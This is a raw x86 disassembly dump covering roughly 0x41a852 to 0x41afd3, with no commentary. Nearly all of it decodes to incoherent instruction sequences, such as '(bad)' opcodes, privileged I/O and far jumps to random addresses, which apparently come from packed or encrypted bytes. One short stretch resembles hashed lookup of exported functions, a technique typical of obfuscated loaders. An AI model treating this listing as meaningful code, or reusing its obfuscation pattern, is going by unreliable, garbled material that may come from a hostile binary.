  41a852:	lock sbb ch,BYTE PTR [esi]
  41a855:	fs cwde 
  41a857:	push   edi
  41a858:	stos   DWORD PTR es:[edi],eax
  41a859:	mov    ebp,0x1879bf80
  41a85e:	imul   DWORD PTR [eax+0x7d]
  41a861:	mov    cl,BYTE PTR [ecx+0x6436df22]
  41a867:	jae    0x41a80d
  41a869:	mov    edx,0xaa8f0693
  41a86e:	(bad)  
  41a86f:	int    0xe2
  41a871:	test   al,0x4a
  41a873:	aaa    
  41a874:	cmp    esp,esi
  41a876:	or     ah,cl
  41a878:	and    edx,esp
  41a87a:	cwde   
  41a87b:	mov    DWORD PTR [ecx],edi
  41a87d:	out    dx,eax
  41a87e:	js     0x41a851
  41a880:	and    DWORD PTR [ebp-0x16],ecx
  41a883:	int3   
  41a884:	jp     0x41a822
  41a886:	call   0x887c1b62
  41a88b:	(bad)  
  41a88c:	mov    edi,0xc66eebc
  41a891:	cmp    eax,0x3b109f2
  41a896:	mov    ebp,0xf44408e4
  41a89b:	cmp    bl,BYTE PTR [ecx]
  41a89d:	ja     0x41a902
  41a89f:	in     al,dx
  41a8a0:	adc    DWORD PTR [edi+eax*2+0x19fb93fc],esp
  41a8a7:	dec    ebp
  41a8a8:	iret   
  41a8a9:	dec    eax
  41a8aa:	iret   
  41a8ab:	in     al,0xb8
  41a8ad:	or     BYTE PTR ds:0x3aa5363,0xc3
  41a8b4:	jmp    0x41c8fd
  41a8b9:	mov    eax,DWORD PTR [ebp-0x2c]
  41a8bc:	movzx  eax,WORD PTR [eax+edi*2]
  41a8c0:	mov    ecx,DWORD PTR [ebp-0x14]
  41a8c3:	mov    eax,DWORD PTR [ecx+eax*4]
  41a8c6:	mov    DWORD PTR [ebp+0xc],eax
  41a8c9:	mov    eax,DWORD PTR [ebp-0x4]
  41a8cc:	mov    ecx,DWORD PTR [ebp-0x8]
  41a8cf:	xor    eax,0x7510850
  41a8d4:	add    eax,ebx
  41a8d6:	cmp    ecx,eax
  41a8d8:	jne    0x41a8eb
  41a8de:	mov    eax,DWORD PTR [ebp-0x4]
  41a8e1:	xor    eax,0x7510850
  41a8e6:	jmp    0x41a8b2
  41a8eb:	mov    eax,DWORD PTR [ebp+0xc]
  41a8ee:	add    eax,DWORD PTR [ebp+0x8]
  41a8f1:	mov    DWORD PTR [ebp-0x10],eax
  41a8f4:	mov    eax,DWORD PTR [ebp-0x1c]
  41a8f7:	test   eax,eax
  41a8f9:	je     0x41bfdb
  41a8ff:	mov    DWORD PTR [ebp-0x24],esi
  41a902:	push   0xb
  41a904:	jmp    0x41ab39
  41a909:	rcl    dh,1
  41a90b:	xlat   BYTE PTR ds:[ebx]
  41a90c:	int3   
  41a90d:	aad    0xd1
  41a90f:	fcmovnu st,st(2)
  41a911:	ss (bad) 
  41a913:	inc    esp
  41a914:	and    DWORD PTR [esp+eax*1],0x49
  41a918:	adc    eax,0x787fd548
  41a91d:	adc    BYTE PTR [esi+0x78],bh
  41a920:	js     0x41a954
  41a922:	leave  
  41a923:	xchg   ebx,eax
  41a924:	bound  esp,QWORD PTR [edi+0x1770cec6]
  41a92a:	ret    
  41a92b:	fbld   TBYTE PTR [edx+eiz*4-0x59]
  41a92f:	cmp    al,0x65
  41a931:	inc    esi
  41a932:	push   ds
  41a933:	(bad)  
  41a934:	and    dl,BYTE PTR [edx+0x2c]
  41a937:	or     bl,bl
  41a939:	enter  0xe3c2,0x19
  41a93d:	test   DWORD PTR [edx],eax
  41a93f:	push   ds
  41a940:	into   
  41a941:	call   0xaf9c670c
  41a946:	add    al,0x7f
  41a948:	mov    al,0xcd
  41a94a:	in     al,0x4b
  41a94c:	call   0xd69bdcaa
  41a951:	repnz mov ecx,0x10e5d7b1
  41a957:	jg     0x41a95f
  41a959:	jecxz  0x41a98e
  41a95b:	mov    ah,0xbd
  41a95d:	popa   
  41a95e:	stc    
  41a95f:	inc    esp
  41a960:	pop    ebx
  41a961:	mov    ds:0xd9760756,eax
  41a966:	mov    ds:0x246c612f,al
  41a96b:	and    eax,0x3984f072
  41a970:	sbb    edx,DWORD PTR [ebx+0x1b]
  41a973:	rcr    BYTE PTR [ecx+0x59dcad46],0x34
  41a97a:	pop    edx
  41a97b:	push   es
  41a97c:	push   0x24
  41a97e:	push   esi
  41a97f:	clc    
  41a980:	or     BYTE PTR [ebx+0x1f6bd551],bl
  41a986:	jbe    0x41a966
  41a988:	jbe    0x41a91e
  41a98a:	mov    dh,0x70
  41a98c:	mov    ch,0xa1
  41a98e:	fstp   TBYTE PTR [eax+0x3]
  41a991:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a992:	jle    0x41a92f
  41a994:	mov    eax,0x3146fa7e
  41a999:	and    ebp,DWORD PTR [ebx+0x60799e99]
  41a99f:	or     edx,DWORD PTR [esi-0x27]
  41a9a2:	arpl   WORD PTR [edi+0x54afdc67],bx
  41a9a8:	int    0xb8
  41a9aa:	repz std 
  41a9ac:	xlat   BYTE PTR ds:[ebx]
  41a9ad:	cli    
  41a9ae:	sub    BYTE PTR [edx+0x5aaa6d76],bl
  41a9b4:	push   esi
  41a9b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9b6:	lds    esi,FWORD PTR [esi-0x5e]
  41a9b9:	bound  ebp,QWORD PTR [edx]
  41a9bb:	sbb    DWORD PTR [esi-0x43ec0757],ebx
  41a9c1:	aad    0xa2
  41a9c3:	loope  0x41a99b
  41a9c5:	jae    0x41aa2d
  41a9c7:	stos   BYTE PTR es:[edi],al
  41a9c8:	push   edi
  41a9c9:	cdq    
  41a9ca:	push   edx
  41a9cb:	jle    0x41a966
  41a9cd:	xor    al,0x3b
  41a9cf:	ror    DWORD PTR [ebp-0x4d],1
  41a9d2:	push   ecx
  41a9d3:	mov    edi,0xa3f289d8
  41a9d8:	xchg   edi,eax
  41a9d9:	sbb    eax,0xf0502ec9
  41a9de:	jle    0x41a9ef
  41a9e0:	adc    esp,DWORD PTR [edx-0x74]
  41a9e3:	(bad)  
  41a9e4:	out    dx,eax
  41a9e5:	sbb    esi,eax
  41a9e7:	icebp  
  41a9e8:	dec    edx
  41a9e9:	mov    ds:0x86eeb4d5,al
  41a9ee:	mov    edx,es
  41a9f0:	call   0x95d8:0x45ceb69e
  41a9f7:	xor    DWORD PTR [ebp+0x76bf9922],eax
  41a9fd:	retf   0xf9e4
  41aa00:	jl     0x41a99f
  41aa02:	out    dx,eax
  41aa03:	push   edx
  41aa04:	ret    
  41aa05:	or     BYTE PTR [esi-0x70ba5b2c],bl
  41aa0b:	(bad)
  41aa0e:	hlt    
  41aa0f:	sub    BYTE PTR [eax+0x1e],dh
  41aa12:	repz pop ss
  41aa14:	gs in  al,0xe2
  41aa17:	xchg   ebp,eax
  41aa18:	jmp    0x41aa6c
  41aa1a:	iret   
  41aa1b:	rcl    BYTE PTR [esi],0xa2
  41aa1e:	imul   ebx,edi,0x6b615c60
  41aa24:	push   es
  41aa25:	aas    
  41aa26:	mov    bh,0x42
  41aa28:	data16 cmps WORD PTR ds:[esi],WORD PTR es:[edi]
  41aa2b:	and    al,0x8e
  41aa2d:	in     al,0x86
  41aa2f:	(bad)  
  41aa30:	mov    al,0xb7
  41aa32:	cwde   
  41aa33:	retf   
  41aa34:	xor    eax,DWORD PTR [ebp-0x7f]
  41aa37:	aas    
  41aa38:	imul   ebp,DWORD PTR [edx-0x124f71d9],0xffffffe5
  41aa3f:	inc    eax
  41aa40:	xor    BYTE PTR [esp+eiz*8-0x66],bh
  41aa44:	dec    esp
  41aa45:	add    esp,DWORD PTR [edi+0x3aa7b27c]
  41aa4b:	adc    BYTE PTR [edx+0x28],ah
  41aa4e:	xlat   BYTE PTR ds:[ebx]
  41aa4f:	jns    0x41aa2e
  41aa51:	vorpd  ymm2,ymm7,ymm4
  41aa55:	test   eax,0xd9dc1b9c
  41aa5a:	inc    ecx
  41aa5b:	add    al,0xcd
  41aa5d:	scas   eax,DWORD PTR es:[edi]
  41aa5e:	pop    esi
  41aa5f:	pop    ss
  41aa60:	int    0xa0
  41aa62:	sar    BYTE PTR [eax],0x79
  41aa65:	inc    esp
  41aa66:	sahf   
  41aa67:	jne    0x41aa71
  41aa69:	fsubr  st(6),st
  41aa6b:	sbb    ah,BYTE PTR [esi-0xef20140]
  41aa71:	or     DWORD PTR [ecx+0x72],edi
  41aa74:	xlat   BYTE PTR ds:[ebx]
  41aa75:	in     al,0x1d
  41aa77:	adc    eax,0x290b33a
  41aa7c:	pop    ss
  41aa7d:	outs   dx,BYTE PTR ds:[esi]
  41aa7e:	mov    esi,0xcd247725
  41aa83:	pop    edx
  41aa84:	add    bl,dh
  41aa86:	push   edi
  41aa87:	push   esi
  41aa88:	jge    0x41aab1
  41aa8a:	sbb    al,0x73
  41aa8c:	inc    ebp
  41aa8d:	rcr    DWORD PTR [eax],0x40
  41aa90:	pusha  
  41aa91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa92:	jmp    0x11bb99d7
  41aa97:	pop    ds
  41aa98:	retf   0x2d45
  41aa9b:	aam    0xa3
  41aa9d:	inc    eax
  41aa9e:	mov    al,ds:0x8f5dd1cd
  41aaa3:	lahf   
  41aaa4:	jp     0x41aa90
  41aaa6:	mov    dh,0x71
  41aaa8:	or     eax,0xad07abe5
  41aaad:	arpl   WORD PTR [ecx],si
  41aaaf:	inc    ebx
  41aab0:	jg     0x41aa81
  41aab2:	adc    DWORD PTR [eax+0x4e],0xfa3866eb
  41aab9:	fs ficomp DWORD PTR fs:[ecx]
  41aabd:	cmp    dl,ah
  41aabf:	lea    ebx,[edx]
  41aac1:	test   BYTE PTR [esi-0x54],bh
  41aac4:	sbb    DWORD PTR [ecx-0x358fe746],0x6ff5bf34
  41aace:	jmp    0x30ebecdf
  41aad3:	add    al,0xca
  41aad5:	shl    DWORD PTR [esi],1
  41aad7:	xchg   BYTE PTR [esi-0x14],bl
  41aada:	test   BYTE PTR [edi],bl
  41aadc:	jns    0x41aaec
  41aade:	iret   
  41aadf:	jo     0x41aa88
  41aae1:	js     0x41aacb
  41aae3:	mov    DWORD PTR [ecx],esi
  41aae5:	xchg   edi,eax
  41aae6:	iret   
  41aae7:	or     ebx,0x67749f32
  41aaed:	out    0x8b,eax
  41aaef:	adc    bh,bl
  41aaf1:	add    edx,esp
  41aaf3:	call   0x9e18:0xe011e2ba
  41aafa:	xor    dl,al
  41aafc:	test   eax,0x20133c00
  41ab01:	inc    edx
  41ab02:	sub    eax,DWORD PTR [edx-0x1d]
  41ab05:	les    ebx,FWORD PTR [ecx-0x4e]
  41ab08:	xchg   cl,dh
  41ab0a:	or     ah,BYTE PTR [eax+0x1b]
  41ab0d:	xchg   esi,eax
  41ab0e:	xchg   edx,eax
  41ab0f:	js     0x41ab30
  41ab11:	push   esp
  41ab12:	addr16 cmc 
  41ab14:	addr16 lahf 
  41ab16:	sub    ch,BYTE PTR [eax]
  41ab18:	pop    edi
  41ab19:	(bad)  
  41ab1a:	rcr    BYTE PTR [ecx],1
  41ab1c:	fdiv   st(6),st
  41ab1e:	pop    edx
  41ab1f:	mov    esi,0x7cc38583
  41ab24:	xchg   ebx,eax
  41ab25:	or     ecx,DWORD PTR [ebx]
  41ab27:	rcr    DWORD PTR [edi+0x74],cl
  41ab2a:	or     eax,0xada02834
  41ab2f:	mov    eax,0xa538e3ad
  41ab34:	repz cmp eax,0x59dc6c16
  41ab3a:	push   0x5
  41ab3c:	dec    ecx
  41ab3d:	pop    ebx
  41ab3e:	jmp    0x41ad73
  41ab43:	rcl    bl,cl
  41ab45:	aas    
  41ab46:	leave  
  41ab47:	cmp    eax,0x48dbdad9
  41ab4c:	pushf  
  41ab4d:	mov    eax,ds:0x7c122fbe
  41ab52:	inc    edx
  41ab53:	pusha  
  41ab54:	fstp   TBYTE PTR [edi+0x78]
  41ab57:	adc    BYTE PTR [esi+0x78],bh
  41ab5a:	js     0x41ab3e
  41ab5c:	sbb    eax,0xf5e45b87
  41ab61:	lods   eax,DWORD PTR ds:[esi]
  41ab62:	iret   
  41ab63:	pop    ecx
  41ab64:	add    dl,ah
  41ab66:	ds xchg ecx,eax
  41ab68:	pop    eax
  41ab69:	xchg   ecx,eax
  41ab6a:	loopne 0x41ab81
  41ab6c:	jp     0x41ab99
  41ab6e:	data16 or al,BYTE PTR [ecx*4-0x18e3309e]
  41ab76:	popa   
  41ab77:	sbb    dl,BYTE PTR [esi]
  41ab79:	push   ebx
  41ab7a:	fisttp QWORD PTR [ebx-0x6e]
  41ab7d:	sti    
  41ab7e:	(bad)
  41ab81:	mov    ds:0x57612b03,al
  41ab86:	cmp    al,0xc8
  41ab88:	jmp    0x5d82:0xc2cb37fe
  41ab8f:	xchg   DWORD PTR [edx+esi*8-0x401c51f6],edi
  41ab96:	ret    
  41ab97:	call   0xd6ee23a2
  41ab9c:	sub    al,0x35
  41ab9e:	push   esi
  41ab9f:	sbb    al,0x48
  41aba1:	test   al,0x1d
  41aba3:	add    BYTE PTR [esi+0x7b4b395],cl
  41aba9:	mov    dh,0xfb
  41abab:	xchg   DWORD PTR [ecx],eax
  41abad:	fnstcw WORD PTR ds:[ebp-0x2168b067]
  41abb4:	pusha  
  41abb5:	jne    0x41ab67
  41abb7:	(bad)  
  41abb8:	xor    eax,esp
  41abba:	data16 add al,0xde
  41abbd:	scas   eax,DWORD PTR es:[edi]
  41abbe:	jmp    0xcd642368
  41abc3:	xor    al,BYTE PTR [edi-0x3]
  41abc6:	int3   
  41abc7:	nop
  41abc8:	mov    ah,0x2a
  41abca:	clc    
  41abcb:	inc    edx
  41abcc:	ins    BYTE PTR es:[edi],dx
  41abcd:	lods   al,BYTE PTR ds:[esi]
  41abce:	add    bl,bh
  41abd0:	aam    0x2
  41abd2:	jmp    0x6c40:0x690efc5a
  41abd9:	aam    0x6b
  41abdb:	adc    eax,0x84f55acc
  41abe0:	sbb    dh,al
  41abe2:	std    
  41abe3:	add    cl,BYTE PTR [eax-0x16]
  41abe6:	mov    BYTE PTR [edi+0x25],0x63
  41abea:	stc    
  41abeb:	test   esi,ecx
  41abed:	mov    bl,BYTE PTR [esi]
  41abef:	test   eax,0x31f29ea9
  41abf4:	adc    al,0xa1
  41abf6:	jg     0x41ac6b
  41abf8:	lods   al,BYTE PTR ds:[esi]
  41abf9:	dec    eax
  41abfa:	or     BYTE PTR [edx-0x47],ah
  41abfd:	aas    
  41abfe:	adc    BYTE PTR es:[esp+esi*4-0x31a7f3f4],0xb
  41ac07:	pop    ss
  41ac08:	out    0xab,eax
  41ac0a:	jmp    0x7aa20e21
  41ac0f:	pop    ebp
  41ac10:	test   al,0x66
  41ac12:	push   esi
  41ac13:	mov    dl,0xf8
  41ac15:	add    DWORD PTR [edi],0x56
  41ac18:	ret    
  41ac19:	and    al,0xce
  41ac1b:	mov    BYTE PTR [ebx-0x78],ch
  41ac1e:	lahf   
  41ac1f:	jb     0x41ac08
  41ac21:	dec    edx
  41ac22:	mov    dh,0x8b
  41ac24:	and    DWORD PTR [edi],edi
  41ac26:	and    BYTE PTR [ebp-0x65],bl
  41ac29:	pushf  
  41ac2a:	inc    edi
  41ac2b:	icebp  
  41ac2c:	mov    ebx,0x9211a15b
  41ac31:	mov    ebp,0x3a390b00
  41ac36:	mov    edi,0xb4873133
  41ac3b:	ds dec ebx
  41ac3d:	stos   DWORD PTR es:[edi],eax
  41ac3e:	and    edx,edi
  41ac40:	inc    esi
  41ac41:	inc    esi
  41ac42:	cs fwait
  41ac44:	(bad)
  41ac49:	mov    ch,0x46
  41ac4b:	jae    0x112bd212
  41ac51:	daa    
  41ac52:	mov    ecx,0x4cb18a2e
  41ac57:	das    
  41ac58:	xchg   DWORD PTR [edx+0x6b],ecx
  41ac5b:	jnp    0x41acd8
  41ac5d:	mov    BYTE PTR [ecx-0x6a],bl
  41ac60:	cld    
  41ac61:	jnp    0x41abe4
  41ac63:	pop    eax
  41ac64:	jecxz  0x41ac7b
  41ac66:	iret   
  41ac67:	(bad)  
  41ac68:	loop   0x41ac8f
  41ac6a:	xchg   edi,eax
  41ac6b:	pop    edx
  41ac6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac6d:	loopne 0x41ac76
  41ac6f:	push   ds
  41ac70:	out    0xb9,eax
  41ac72:	inc    eax
  41ac73:	inc    edx
  41ac74:	add    DWORD PTR [ebp+0x56242961],0xffffffa6
  41ac7b:	inc    esi
  41ac7c:	xchg   BYTE PTR [edi-0xb],dh
  41ac7f:	hlt    
  41ac80:	sahf   
  41ac81:	mov    ebp,0x6b973656
  41ac86:	jne    0x41ac54
  41ac88:	jae    0x41ac9f
  41ac8a:	push   ss
  41ac8b:	das    
  41ac8c:	or     al,0x7a
  41ac8e:	mov    bl,BYTE PTR [ebx]
  41ac90:	(bad)  
  41ac91:	imul   eax,esp,0xffffffca
  41ac94:	fld    DWORD PTR [esi+0x6d365488]
  41ac9a:	stc    
  41ac9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac9c:	(bad)  
  41ac9d:	jmp    0x41ac38
  41ac9f:	es jp  0x41ace6
  41aca2:	icebp  
  41aca3:	adc    ecx,ecx
  41aca5:	cwde   
  41aca6:	ret    0x1976
  41aca9:	xor    dh,ah
  41acab:	dec    eax
  41acac:	push   edx
  41acad:	retf   
  41acae:	mov    BYTE PTR ds:0x28070ad7,0x4a
  41acb5:	mov    ecx,0x17a3b1a0
  41acba:	cs or  eax,0x6772ee72
  41acc0:	clc    
  41acc1:	(bad)  
  41acc2:	in     al,0x91
  41acc4:	popf   
  41acc5:	cmp    al,0x3e
  41acc7:	mov    WORD PTR [edx-0x755e67aa],fs
  41accd:	mov    dl,0xa3
  41accf:	fs jbe 0x41acaa
  41acd2:	cmp    BYTE PTR es:[eax],bh
  41acd5:	push   es
  41acd6:	or     eax,0xf0c048f7
  41acdb:	cld    
  41acdc:	mov    ch,0x27
  41acde:	xchg   ebx,eax
  41acdf:	mov    ch,0x2a
  41ace1:	cmp    edx,DWORD PTR [esi+esi*1]
  41ace4:	push   ecx
  41ace5:	jb     0x41ace8
  41ace7:	repnz fdiv QWORD PTR [esi]
  41acea:	xor    edi,ebp
  41acec:	mov    al,ds:0x74c3466c
  41acf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acf2:	out    dx,al
  41acf3:	sti    
  41acf4:	aam    0x6e
  41acf6:	test   DWORD PTR [ebp-0x4f04c061],0xeae67ec0
  41ad00:	fwait
  41ad01:	jne    0x41acf0
  41ad03:	mov    bh,0xda
  41ad05:	repnz std 
  41ad07:	xchg   esp,ebp
  41ad09:	xchg   edx,eax
  41ad0a:	in     eax,dx
  41ad0b:	gs or  cl,ah
  41ad0e:	mov    edx,0x779881f1
  41ad13:	and    cl,BYTE PTR [ebx+eiz*8-0x15]
  41ad17:	sbb    bl,dl
  41ad19:	mov    ds:0x5dd27dab,eax
  41ad1e:	push   ecx
  41ad1f:	mov    cl,0xee
  41ad21:	rcl    DWORD PTR [ecx],1
  41ad23:	vpaddd xmm4,xmm0,XMMWORD PTR [esi]
  41ad27:	repnz shl DWORD PTR [edi+0x2342b47b],0x7d
  41ad2f:	push   ss
  41ad30:	push   0x271eeaf5
  41ad35:	hlt    
  41ad36:	adc    BYTE PTR [esi],ch
  41ad38:	lods   eax,DWORD PTR ds:[esi]
  41ad39:	clc    
  41ad3a:	push   edi
  41ad3b:	cwde   
  41ad3c:	push   ds
  41ad3d:	std    
  41ad3e:	test   BYTE PTR [edi+0x45],0x34
  41ad42:	popa   
  41ad43:	mov    ch,0x69
  41ad45:	dec    edx
  41ad46:	mov    ecx,0x32c4caca
  41ad4b:	sahf   
  41ad4c:	dec    ebx
  41ad4d:	adc    ecx,DWORD PTR [eax]
  41ad4f:	pop    esi
  41ad50:	mov    al,ds:0xe357f44d
  41ad55:	hlt    
  41ad56:	mov    ebp,0xb4f423fd
  41ad5b:	push   esi
  41ad5c:	sub    al,0x3e
  41ad5e:	jo     0x41ad4f
  41ad60:	push   edx
  41ad61:	mov    eax,0x999e190d
  41ad66:	inc    ebx
  41ad67:	test   eax,0x32978f1d
  41ad6c:	push   eax
  41ad6d:	test   eax,0x682c77e8
  41ad72:	inc    ebp
  41ad73:	xchg   ebx,ecx
  41ad75:	sub    ebx,ecx
  41ad77:	jmp    0x41afac
  41ad7c:	ret    0xd1d7
  41ad7f:	aas    
  41ad80:	fxch   st(1)
  41ad82:	rcr    cl,cl
  41ad84:	mov    ds:0x10d25295,eax
  41ad89:	gs daa 
  41ad8b:	int3   
  41ad8c:	js     0x41ad66
  41ad8e:	jg     0x41ae08
  41ad90:	adc    BYTE PTR [esi+0x78],bh
  41ad93:	js     0x41adeb
  41ad95:	and    DWORD PTR [edi],eax
  41ad97:	mov    ch,0xdf
  41ad99:	or     DWORD PTR [eax],edi
  41ad9b:	pop    ecx
  41ad9c:	sbb    DWORD PTR [esi+0x1a],ebx
  41ad9f:	push   ss
  41ada0:	adc    ebx,DWORD PTR [ebx+ebp*1]
  41ada3:	fmul   QWORD PTR [esi+ebx*1+0x720366e4]
  41adaa:	pop    eax
  41adab:	xor    esi,esi
  41adad:	adc    al,0x73
  41adaf:	add    DWORD PTR cs:[edx+0x60320fd5],0xffffffd8
  41adb7:	rcr    BYTE PTR [edx-0x3fa7d46f],1
  41adbd:	cmp    dl,bh
  41adbf:	add    edi,DWORD PTR [eax+0x5fb1ad19]
  41adc5:	cmc    
  41adc6:	jle    0x41ada0
  41adc8:	loop   0x41addf
  41adca:	fisub  DWORD PTR [eax-0x4850fa69]
  41add0:	nop
  41add1:	mov    BYTE PTR [eax+0x41e427a],dh
  41add7:	pop    ecx
  41add8:	dec    edx
  41add9:	add    ebx,ecx
  41addb:	mov    eax,0x2fc0ad9a
  41ade0:	jmp    0x41ae52
  41ade2:	pop    ss
  41ade3:	shr    DWORD PTR [edx+0x79],0xc2
  41ade7:	aaa    
  41ade8:	inc    esp
  41ade9:	das    
  41adea:	(bad)  
  41adeb:	sbb    al,0x7
  41aded:	or     BYTE PTR [ebx],al
  41adef:	push   ds
  41adf0:	dec    ebx
  41adf1:	int    0xf6
  41adf3:	imul   eax,DWORD PTR [eax],0x5bc2c1d7
  41adf9:	(bad)  
  41adfa:	aam    0xba
  41adfc:	inc    esi
  41adfd:	inc    ecx
  41adfe:	sbb    BYTE PTR [ebx],cl
  41ae00:	ins    DWORD PTR es:[edi],dx
  41ae01:	lods   eax,DWORD PTR ds:[esi]
  41ae02:	add    ecx,DWORD PTR ds:0xd8b7fad1
  41ae08:	inc    ebp
  41ae09:	pop    ebp
  41ae0a:	mov    eax,0x43ed14a5
  41ae0f:	cmp    DWORD PTR [esi+0x46],ebp
  41ae12:	push   cs
  41ae13:	addr16 test eax,0xac51c002
  41ae19:	sbb    DWORD PTR [eax],0xffffff8d
  41ae1c:	push   ebp
  41ae1d:	ret    0x7089
  41ae20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae21:	sbb    al,0xe0
  41ae23:	frstor [ebp-0x26]
  41ae26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae27:	adc    DWORD PTR [eax-0x5e0aca5d],esi
  41ae2d:	mov    edi,ebp
  41ae2f:	sub    eax,0xd50e443b
  41ae34:	repz push edi
  41ae36:	(bad)  
  41ae37:	cmp    dh,BYTE PTR [ebp-0x1c68b857]
  41ae3d:	jno    0x41aeb8
  41ae3f:	(bad)  
  41ae40:	sub    DWORD PTR [edi],ecx
  41ae42:	adc    eax,0x702bcca1
  41ae47:	mov    dh,0x3b
  41ae49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae4a:	shl    BYTE PTR [edx-0x635eb26f],cl
  41ae50:	mov    ecx,0x801c156f
  41ae55:	std    
  41ae56:	dec    esp
  41ae57:	cmp    edx,DWORD PTR [eax]
  41ae59:	loope  0x41ae63
  41ae5b:	std    
  41ae5c:	call   DWORD PTR [edx]
  41ae5e:	in     al,0xc0
  41ae60:	xor    ebp,esi
  41ae62:	pop    ss
  41ae63:	dec    eax
  41ae64:	out    0x2c,al
  41ae66:	sbb    al,0xd4
  41ae68:	or     DWORD PTR [ecx+0x21],edx
  41ae6b:	add    BYTE PTR [ecx-0x4b],0x75
  41ae6f:	cmp    ch,al
  41ae71:	(bad)  
  41ae72:	xor    DWORD PTR [ecx],esi
  41ae74:	in     eax,dx
  41ae75:	fdiv   QWORD PTR ds:0xc719d344
  41ae7b:	pop    edx
  41ae7c:	test   DWORD PTR [ebp-0x4b2478bc],ecx
  41ae82:	xchg   edx,eax
  41ae83:	xchg   ebp,eax
  41ae84:	pop    es
  41ae85:	pop    ds
  41ae86:	ss dec ebp
  41ae88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae89:	mov    esi,0x1bcbc1fe
  41ae8e:	(bad)  
  41ae8f:	pop    ecx
  41ae90:	stos   DWORD PTR es:[edi],eax
  41ae91:	xchg   esp,eax
  41ae92:	(bad)  
  41ae93:	adc    eax,0x64202e26
  41ae98:	jmp    0x23af:0x5f822a7b
  41ae9f:	(bad)  
  41aea0:	fnsave [ecx+edi*8+0x56]
  41aea4:	cmp    ah,BYTE PTR [eax]
  41aea6:	xchg   ecx,eax
  41aea7:	sbb    dl,ch
  41aea9:	sub    DWORD PTR [esi+0x6570a6e6],edi
  41aeaf:	fcomp  QWORD PTR [edx+0x7ac27ab3]
  41aeb5:	push   edx
  41aeb6:	inc    esp
  41aeb7:	int    0x15
  41aeb9:	push   eax
  41aeba:	jp     0x41aebf
  41aebc:	lods   al,BYTE PTR ds:[esi]
  41aebd:	cwde   
  41aebe:	push   0xffffffeb
  41aec0:	adc    ebx,eax
  41aec2:	arpl   WORD PTR [edx],bp
  41aec4:	setae  BYTE PTR [eax-0x61]
  41aec8:	xchg   edi,eax
  41aec9:	stos   BYTE PTR es:[edi],al
  41aeca:	mov    ch,0xb4
  41aecc:	fs fsub st,st(7)
  41aecf:	jnp    0x41aec8
  41aed1:	pop    edi
  41aed2:	dec    ecx
  41aed3:	push   0x2f
  41aed5:	push   0xffffff9a
  41aed7:	aad    0x8d
  41aed9:	iret   
  41aeda:	pop    es
  41aedb:	xor    al,0xd3
  41aedd:	int    0x5d
  41aedf:	dec    eax
  41aee0:	jmp    0x683d:0xc2bfafcb
  41aee7:	stos   DWORD PTR es:[edi],eax
  41aee8:	add    dh,BYTE PTR [ebp-0x650c2cff]
  41aeee:	sub    DWORD PTR [ebx],ebx
  41aef0:	(bad)  
  41aef1:	mul    DWORD PTR [esi-0x4]
  41aef4:	cmp    al,0xce
  41aef6:	retf   0x549c
  41aef9:	xchg   ecx,eax
  41aefa:	mov    eax,ds:0xc9f60158
  41aeff:	jmp    0x3b5b:0x4af166c
  41af06:	lahf   
  41af07:	dec    eax
  41af08:	add    BYTE PTR fs:[edx],dl
  41af0b:	xor    eax,0xf01cdac3
  41af10:	inc    esp
  41af11:	sub    BYTE PTR ds:0x53f562ba,ch
  41af17:	stos   BYTE PTR es:[edi],al
  41af18:	loope  0x41af26
  41af1a:	push   edi
  41af1b:	sbb    al,BYTE PTR [ecx]
  41af1d:	cmp    eax,0x2a170a8c
  41af22:	(bad)  
  41af23:	stos   DWORD PTR es:[edi],eax
  41af24:	dec    ecx
  41af25:	pop    es
  41af26:	ss out dx,al
  41af28:	xchg   ecx,eax
  41af29:	test   eax,0x42a84a57
  41af2e:	(bad)
  41af32:	sbb    BYTE PTR [edi+0x7e],bh
  41af35:	rol    DWORD PTR [edx+ebx*4-0xee086e4],0x79
  41af3d:	adc    ch,BYTE PTR [edi+ebp*8]
  41af40:	mov    bh,0xd3
  41af42:	test   al,0x6f
  41af44:	xchg   esi,eax
  41af45:	jb     0x41afa2
  41af47:	sub    esi,DWORD PTR [ebx+0x57402f62]
  41af4d:	cli    
  41af4e:	test   BYTE PTR [ebx-0x3a251880],0x54
  41af55:	loop   0x41af84
  41af57:	push   ecx
  41af58:	call   0x5b6b2d05
  41af5d:	dec    edx
  41af5e:	or     ebx,DWORD PTR [ebx]
  41af60:	sub    eax,0x3849f42d
  41af65:	cs or  dl,ah
  41af68:	mov    dh,0xe3
  41af6a:	sub    bl,BYTE PTR [esi-0x6f]
  41af6d:	ror    BYTE PTR [ecx+0x74],1
  41af70:	scas   al,BYTE PTR es:[edi]
  41af71:	imul   eax,DWORD PTR [ecx-0x1],0x6b
  41af75:	and    ebx,DWORD PTR cs:[edx+0x5a8fe1ee]
  41af7c:	adc    BYTE PTR [edx-0x5541b68d],0x8f
  41af83:	nop
  41af84:	cli    
  41af85:	hlt    
  41af86:	pop    ebx
  41af87:	fild   WORD PTR [esi]
  41af89:	enter  0x8989,0x80
  41af8d:	mov    eax,ds:0x9ed22769
  41af92:	sub    BYTE PTR [eax-0x8],al
  41af95:	mov    ebp,0xb29c1e1d
  41af9a:	cmp    edx,DWORD PTR [eax+0x68]
  41af9d:	sbb    DWORD PTR [edi],esi
  41af9f:	(bad)  
  41afa1:	clc    
  41afa2:	sbb    cl,0xa
  41afa5:	cdq    
  41afa6:	cld    
  41afa7:	sbb    al,0x25
  41afa9:	sbb    edx,ebp
  41afab:	scas   al,BYTE PTR es:[edi]
  41afac:	xchg   ebx,ecx
  41afae:	jmp    0x41b1e3
  41afb3:	(bad)
  41afb6:	int    0xd4
  41afb8:	int    0xd9
  41afba:	fnstcw WORD PTR [edi-0x6ce7effd]
  41afc0:	lahf   
  41afc1:	mov    eax,ds:0x7fde10af
  41afc6:	js     0x41afd8
  41afc8:	jle    0x41b042
  41afca:	js     0x41af99
  41afcc:	add    eax,DWORD PTR [eax-0x67]
  41afcf:	les    eax,FWORD PTR [edi+ecx*4+0x75]
  41afd3:	pushf  
